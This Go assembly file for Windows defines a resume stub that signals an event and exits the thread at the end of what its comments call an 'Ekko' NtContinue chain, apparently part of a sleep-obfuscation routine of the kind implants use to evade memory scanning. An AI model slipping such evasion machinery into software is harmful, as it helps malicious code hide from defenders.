// +build windows,amd64

#include "textflag.h"

// func resumeStub()
// The last NtContinue in the Ekko chain lands a pool thread here.
// The thread is not known to the Go runtime — we must NOT enter any
// Go function. Steps:
//   1. Load the resume-event handle from ·ekkoResumeEvent
//   2. Call SetEvent(handle) via ·ekkoProcSetEvent
//   3. Call ExitThread(0) via ·ekkoProcExitThread
//
// Calling convention: Windows x64 — RCX = first arg, shadow space 0x20 on stack.
TEXT ·resumeStub(SB), NOSPLIT|NOFRAME, $0
	SUBQ $0x28, SP
	MOVQ ·ekkoResumeEvent(SB), CX
	MOVQ ·ekkoProcSetEvent(SB), AX
	CALL AX
	MOVQ $0, CX
	MOVQ ·ekkoProcExitThread(SB), AX
	CALL AX
	BYTE $0xCC // INT3 — unreachable, ExitThread does not return
